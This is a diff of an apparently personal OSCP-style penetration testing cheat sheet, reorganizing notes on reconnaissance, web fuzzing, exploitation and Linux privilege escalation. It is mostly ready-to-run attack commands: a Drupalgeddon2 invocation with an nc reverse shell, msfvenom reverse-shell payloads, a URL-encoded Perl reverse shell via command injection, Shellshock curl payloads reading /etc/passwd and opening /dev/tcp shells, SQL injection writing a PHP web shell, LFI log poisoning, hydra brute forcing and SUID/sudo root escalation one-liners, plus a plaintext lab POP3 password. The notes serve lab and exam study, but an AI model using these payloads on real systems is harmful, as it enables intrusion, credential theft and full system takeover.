@@ -5,9 +5,17 @@ https://www.netsecfocus.com/oscp/2021/05/06/The_Journey_to_Try_Harder-_TJnull-s_
 https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html
 https://liodeus.github.io/2020/09/18/OSCP-personal-cheatsheet.html
 https://blog.adithyanak.com/oscp-preparation-guide/linux-privilege-escalation
+https://hausec.com/pentesting-cheatsheet/#_Toc475368980
 
 
 # Recon
+
+```bash
+ping <IP> -R
+ping <IP> -c 3 # View TTL
+```
+
+### nmap
 ```bash
 nmap -Pn -sT -sV -n <IP> -p- --min-rate 1000 --max-retries 2 --reason
 nmap -Pn -sT -sV -sC -n <IP> -p <PORTS> 
@@ -25,9 +33,6 @@ nmap --script smtp-enum-users <IP> -p 25
 
 nmap -Pn -sT -sV --script irc-botnet-channels,irc-info,irc-unrealircd-backdoor -n <IP> -p 6667,6697,8067 
 ```
-```bash
-binwalk -e save.zip 
-```
 
 ### SMTP 
 http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum
@@ -37,6 +42,17 @@ smtp-user-enum -M EXPN -u root -t <IP>
 smtp-user-enum -M RCPT  -u root -t <IP>
 ```
 
+### POP3
+```bash
+nc -nv 10.10.10.17 110
+USER orestis
+PASS kHGuERB29DNiNE
+STAT  --> Numer of msj
+LIST
+RETR 1
+```
+
+### SMB
 ```bash
 smbclient -L <IP> -N
 smbclient //IP/<RESOURCE> -N
@@ -52,10 +68,8 @@ mount -t cifs //<IP>/IPC$ /tmp -o username=null,password=null,domain=WORKGROUP
 ```bash
 smbmap -H <IP> -u ''
 ```
-```bash
-ping <IP> -R
-ping <IP> -c 3 # View TTL
-```
+
+### http
 ```bash
 curl -s -i -k https://<IP>
 curl -L <URL>
@@ -67,7 +81,7 @@ curl --user admin:admin <URL>/system/config/config_inc.php.sample
 nikto -h <URL> -C all
 ```
 
-## Fuzzer directory
+### http fuzzer directory
 ```bash
 dirb <URL>
 ```
@@ -80,6 +94,7 @@ python3 /opt/dirsearch/dirsearch.py -u <URL> -w /usr/share/seclists/Discovery/We
 ```
 ```bash
 gobuster -u <URL> -t 50 -w /usr/share/dirb/wordlists/big.txt -x .php,.html,.txt -r 
+gobuster dir -u <URL> -w /opt/SecLists/Discovery/Web-Content/raft-small-directories.txt -k #https
 ```
 ```bash
 wfuzz -c -t 500 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://<IP>/FUZZ
@@ -88,7 +103,7 @@ wfuzz -c -t 500 --hc=404 --hh=376 -w /opt/SecLists/Fuzzing/LFI/LFI-LFISuite-path
 wfuzz -c -t 500 --hc=400,404,403 --basic admin:admin -w /opt/dirsearch/db/dicc.txt http://<IP>/system/FUZZ
 ```
 
-### CMS
+### http cms
 https://www.einstijn.com/penetration-testing/website-username-password-brute-forcing-with-hydra/
 https://github.com/Dionach/CMSmap
 https://github.com/NoorQureshi/WPSeku-1
@@ -106,10 +121,14 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/wp-logi
 hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-form-post "/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:User name or password incorrect"
 hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-form-post "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.84.123%2Fwordpress%2Fwp-admin%2F&testcookie=1:Lost your password"
 
-https://raw.githubusercontent.com/lorddemon/drupalgeddon2/master/drupalgeddon2.py
-python drupalgeddon2.py -h <URL> -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <MyIP> <PORT> >/tmp/f"
-
 49947-cms-made-simple-v2.2.13---paper.pdf
+```
+```bash
+droopescan scan drupal -u <url>
+```
+
+```bash
+binwalk -e save.zip 
 ```
 
 # Explotation
@@ -117,7 +136,24 @@ python drupalgeddon2.py -h <URL> -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh 
 searchsploit <>
 ```
 
-## SHELLS
+Paramiko
+https://jm33.me/an-rce-approach-of-cve-2018-7750.html
+
+Elastix 2.2.0 LFI
+https://www.exploit-db.com/exploits/37637
+
+Druppal CVE-2018-7600
+drupalgedddon 
+https://github.com/dreadlocked/Drupalgeddon2
+
+https://raw.githubusercontent.com/lorddemon/drupalgeddon2/master/drupalgeddon2.py
+```bash
+python drupalgeddon2.py -h <URL> -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <MyIP> <PORT> >/tmp/f"
+
+PHP filter # RCE
+```
+
+### shells
 https://netsec.ws/?p=337
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#perl
 https://book.hacktricks.xyz/shells/shells/msfvenom
@@ -128,10 +164,9 @@ msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf
 
 http://192.168.61.86/?host=;perl -e %20%27use%20Socket;$i=%22192.168.49.61%22;$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(%22tcp%22));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,%22%3E%26S%22);open(STDOUT,%22%3E%26S%22);open(STDERR,%22%3E%26S%22);exec(%22/bin/sh%20-i%22);};%27
-
 ```
 
-## Brute force
+### Brute force
 https://book.hacktricks.xyz/brute-force
 ```bash
 john hash_passwd.txt --wordlist=/usr/share/wordlists/rockyou.txt
@@ -157,24 +192,29 @@ unzip cathrine.zip
 cewl http://192.168.148.80 -m 5 -w words.txt
 ```
 
-## SSH
+### SSH id_rsa
 ```bash
 chmod 600 id_rsa 
 chmod 644 ../keys/private.bak 
 ssh -i id_rsa tom@192.168.74.107
 
 /usr/bin/base32 /root/.ssh/id_rsa | base32 --decode
+
+grep -r -l "Welcome to SSH" 2>/dev/null
+ls -l /etc/update-motd.d/00-header
 ```
 
-## SHELLSOCK
+### http SHELLSOCK
 https://www.sevenlayers.com/index.php/125-exploiting-shellshock
 ```bash
 curl -A '() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id' http://<IP>:<PORT>/cgi-bin/helloworld
 curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' http://192.168.80.87/cgi-bin/test
 curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/bash -l > /dev/tcp/192.168.49.80/80 0<&1 2>&1' http://<IP>/cgi-bin/test
+nmap -sV -Pn -n --script=http-shellshock.nse --script-args uri=/cgi-bin/calendar.cgi <IP> -p80
+
 ```
 
-## IRC
+### IRC
 https://book.hacktricks.xyz/pentesting/pentesting-irc
 ```bash
 nc -vn 192.168.60.120 8067
@@ -187,7 +227,7 @@ LIST
 WHOIS
 ```
 
-## SQL
+### SQL
 ```bash
 ' or 1=1 --
 ```
@@ -196,7 +236,7 @@ select load_file('/etc/passwd');
 select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE '/var/www/html/shell.php';
 ```
 
-## LFI
+### LFI
 https://www.hackingarticles.in/apache-log-poisoning-through-lfi/
 https://chryzsh.gitbooks.io/pentestbook/content/local_file_inclusion.html
 ```bash
@@ -233,9 +273,12 @@ http://<IP>/console/file.php?file=/var/log/auth.log&cmd=./shell.elf
 curl --user-agent "<?php system($_GET['cmd']); ?>" http://192.168.135.72
 curl http://192.168.135.72:8593/index.php?book=../../../../var/log/apache2/access.log\&cmd=whoami
 
+LFI + PHPinfo
+https://www.insomniasec.com/downloads/publications/phpinfolfi.py
+https://0xdf.gitlab.io/2020/04/22/htb-nineveh.html
 ```
 
-## Interactive shell
+### Interactive shell
 ```bash
 script /dev/null -c bash
 ctrl + ^Z
@@ -250,7 +293,10 @@ stty rows 26 columns 211
 ```
 stty -a # get rows and colummns
 
-## Escape restricted shell
+
+### Escape restricted shell
+https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/
+https://null-byte.wonderhowto.com/how-to/escape-restricted-shell-environments-linux-0341685/
 ```bash
 user@host:~$ vim
 :set shell=/bin/sh
@@ -259,7 +305,7 @@ user@host:~$ vim
 $ /bin/bash
 ```
 
-## Recon
+### Recon
 ```bash
 cat /etc/passwd | cut -d ':' -f 1,7 | grep "bash\|sh" | grep -v "sshd"
 cat /etc/passwd | grep bash
@@ -274,11 +320,14 @@ base32 --decode "MFZG233VOI5FG2DJMVWGIQBRGIZQ===="
 # Privilege escalation
 https://gtfobins.github.io
 https://book.hacktricks.xyz/linux-unix/privilege-escalation
+https://github.com/pha5matis/Pentesting-Guide/blob/master/privilege_escalation_-_linux.md
 https://github.com/carlospolop/hacktricks/tree/master/linux-unix/privilege-escalation
 https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/privilege-escalation/linux/linux-examples.rst
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
+https://payatu.com/guide-linux-privilege-escalation #MySQL UDF Dynamic Library
+https://academy.hackthebox.com/course/preview/linux-privilege-escalation/introduction-to-linux-privilege-escalation
 
-## Exploits
+### Local exploits
 
 ```bash
 cat /etc/issue
@@ -312,7 +361,7 @@ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dirtycow2 40847.cpp -lutil
 g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
 ```
 
-## SUID
+### SUID
 ```bash
 $ find / -perm -u=s -type f 2>/dev/null
 $ find / -perm -4000 2>/dev/null
@@ -325,7 +374,7 @@ $ /usr/bin/vim.basic -c ':py3 import os; os.execl("/bin/bash", "bash", "-pc", "r
 $ /usr/bin/vim.basic -c ':py3 import os; os.execl("/bin/bash", "bash", "-pc", "reset; chmod u+s /bin/bash")'
 ```
 
-## Tools 
+### Tools 
 https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
 
 https://github.com/diego-treitos/linux-smart-enumeration
@@ -338,13 +387,15 @@ https://github.com/sleventyeleven/linuxprivchecker
 
 https://github.com/pentestmonkey/unix-privesc-check
 
-## Files OR DIR
+### Files or dirs
 ```bash
 /var/www/html/admin/.htpasswd 
 /usr/share/nginx/html/
+find /-name *config*.php
+/var/www/html/sites/default/settings.php #Drupal
 ```
 
-## SUDO
+### SUDO
 ```bash
 sudo -l
 ```
@@ -359,15 +410,14 @@ sudo python -c 'import os; os.system("chmod u+s /bin/bash")'
 sudo /bin/bash  # (ALL : ALL) ALL
 
 /bin/systemctl start|stop|restart apache2
-cat /etc/apache2/apache2.conf | grep <user>
+cat /etc/apache2/apache2.conf | grep <user> # Change user
 
 TF=$(mktemp)
 echo 'os.execute("/bin/sh")' > $TF
 sudo nmap --script=$TF
-
 ```
 
-## Linux capabilities
+### Linux capabilities
 https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities
 https://materials.rangeforce.com/tutorial/2020/02/19/Linux-PrivEsc-Capabilities/
 ```bash
@@ -388,7 +438,7 @@ getcap /sbin/ping
 capsh --print
 ```
 
-## Python exec
+### Python exec
 https://www.geeksforgeeks.org/exec-in-python/
 ```bash
 lucy@pyexp:~$ more /opt/exp.py 
@@ -401,16 +451,35 @@ lucy@pyexp:~$ ls -la /bin/bash
 -rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
 ```
 
-## Write files
+### Write files or dirs
 ```bash
+find / -perm -2 -type f 2>/dev/null
 find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
+
+find / -writable -type d 2>/dev/null
+find / -perm -222 -type d 2>/dev/null
+find / -perm -o w -type d 2>/dev/null
 ```
 
-## Scheduled tasks
+### Scheduled tasks
 https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy32s
 https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s
+
+Check writables
 ```bash
 cat /etc/crontab 
+ls -alh /var/spool/cron
+ls -al /etc/ | grep cron
+ls -al /etc/cron*
+cat /etc/cron*
+cat /etc/at.allow
+cat /etc/at.deny
+cat /etc/cron.allow
+cat /etc/cron.deny
+cat /etc/anacrontab
+cat /var/spool/cron/crontabs/root
+ls -la /usr/local/sbin/cron-logrotate.sh
+
 ps -aux | more
 ```
 ```bash
@@ -431,7 +500,6 @@ done
 
 ## Containers
 https://www.hackingarticles.in/lxd-privilege-escalation/
-
 ```bash
 kali$ id
 kali$ git clone https://github.com/saghul/lxd-alpine-builder.git
